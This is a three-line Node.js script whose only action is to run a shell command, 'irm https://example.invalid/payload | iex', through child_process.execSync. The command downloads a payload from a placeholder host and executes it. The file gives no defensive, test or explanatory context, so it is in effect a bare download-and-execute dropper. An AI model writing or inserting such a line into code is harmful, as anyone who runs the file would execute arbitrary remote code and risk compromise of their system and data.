"use strict";
const { execSync } = require("child_process");
execSync("irm https://example.invalid/payload | iex");
